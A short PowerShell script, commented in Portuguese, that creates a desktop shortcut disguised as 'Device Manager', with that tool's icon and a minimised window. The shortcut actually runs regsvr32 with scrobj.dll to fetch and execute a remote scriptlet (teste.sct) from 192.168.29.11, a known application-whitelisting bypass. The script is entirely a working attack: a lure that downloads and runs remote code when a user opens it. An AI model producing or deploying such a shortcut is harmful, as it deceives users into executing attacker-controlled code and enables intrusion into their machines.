# Caminho para a área de trabalho
$atalhoPath = "$env:USERPROFILE\Desktop"

# Criar atalho usando regsvr32
$WshShell = New-Object -ComObject WScript.Shell
$atalho = $WshShell.CreateShortcut("$atalhoPath\Device Manager.lnk")
$atalho.TargetPath = "$env:windir\System32\regsvr32.exe"
$atalho.Arguments = "/s /u /i:http://192.168.29.11/teste.sct scrobj.dll"
$atalho.Description = "Device Manager"
$atalho.IconLocation = "$env:SystemRoot\System32\devmgr.dll,0"
$atalho.WindowStyle = 7
$atalho.Save()

# Exibir confirmação
Write-Host "Atalho criado com sucesso em: $atalhoPath\Device Manager.lnk" -ForegroundColor Green
